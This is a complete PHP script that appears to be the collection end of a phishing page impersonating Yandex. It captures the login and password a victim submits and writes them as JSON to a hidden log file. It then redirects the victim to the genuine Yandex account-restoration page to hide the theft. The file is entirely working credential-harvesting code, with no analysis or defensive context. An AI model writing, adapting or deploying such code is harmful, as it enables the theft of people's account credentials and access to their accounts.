<?php

header('Location: https://passport.yandex.com/restoration');
$data = array('site' => 'Yandex',
  'user' => $_POST['login'],
  'pass' => $_POST['passwd']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>